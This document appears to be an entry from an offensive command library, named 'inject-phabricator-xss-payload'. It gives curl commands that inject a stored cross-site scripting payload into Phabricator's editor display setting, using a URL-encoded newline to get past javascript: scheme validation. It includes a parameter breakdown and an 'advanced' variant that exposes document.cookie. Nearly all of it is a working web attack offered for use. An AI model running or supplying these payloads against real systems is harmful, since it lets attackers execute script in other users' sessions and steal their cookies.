---
id: c1b2c3d4-e5f6-7890-abcd-ef1234567895
data: >-
  curl 'https://phabricator.example.com/settings/panel/display/' -X POST
  --data-raw 'editor=javascript%0A%3Aalert(1)&__csrf__=token' -H 'Cookie:
  phabricator.sid=abc123;'
tags:
  - xss
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:31.188Z'
verified: false
validated: true
submitted: true
---
# inject-phabricator-xss-payload

## Command

```bash
curl 'https://phabricator.example.com/settings/panel/display/' -X POST --data-raw 'editor=javascript%0A%3Aalert(1)&__csrf__=token' -H 'Cookie: phabricator.sid=abc123;'
```

## Description

This command sends a modified POST request to Phabricator's settings endpoint using curl, injecting an XSS payload into the 'editor' parameter to bypass javascript: scheme validation with a URL-encoded newline.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--data-raw` | Specifies the POST body with encoded payload | Yes |
| `-H 'Cookie: ...'` | Includes session cookie for authentication | Yes |
| `editor=javascript%0A%3Aalert(1)` | Malicious value: javascript + newline (%0A) + : (%3A) + alert(1) | Yes |
| `__csrf__=token` | CSRF token from captured request | Yes |

## Examples

### Basic Usage

```bash
curl 'https://target.com/settings/panel/display/' -X POST --data-raw 'editor=javascript%0A%3Aalert(1)&__csrf__=abc' -H 'Cookie: session=xyz'
```

### Advanced Usage

```bash
curl 'https://target.com/settings/panel/display/' -X POST --data-raw 'editor=javascript%0A%3Aalert(document.cookie)&__csrf__=abc' -H 'Cookie: session=xyz' -v
```

## Expected Output

HTTP/1.1 200 OK response body indicating successful configuration update, possibly with a redirect to the settings page.

## Related

- [[Related Procedure|procedures/Inject-Malicious-Editor-Parameter-via-Curl]]
